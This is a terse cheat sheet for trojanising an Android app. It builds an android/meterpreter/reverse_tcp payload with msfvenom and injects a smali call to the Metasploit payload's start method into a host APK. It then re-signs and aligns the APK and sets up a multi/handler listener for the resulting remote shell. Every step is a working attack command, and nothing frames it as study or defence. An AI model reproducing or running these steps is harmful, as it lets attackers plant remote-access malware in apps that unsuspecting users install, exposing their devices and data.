msfvenom -p android/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<port> M> <location>



# Injecting the smali file

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

# Creating a keystore file

keytool -genkey -V -keystore <path for keystore> -alias yash -keyalg RSA -keysize 2048 -validity 1000



# Signing an apk

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore <keystore location> <apk location> yash


# Aligning an apk

zipalign -v 4 <initial apk location> <final apk location>


# Listening using msfconsole

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost <lhost>
set lport <lport>
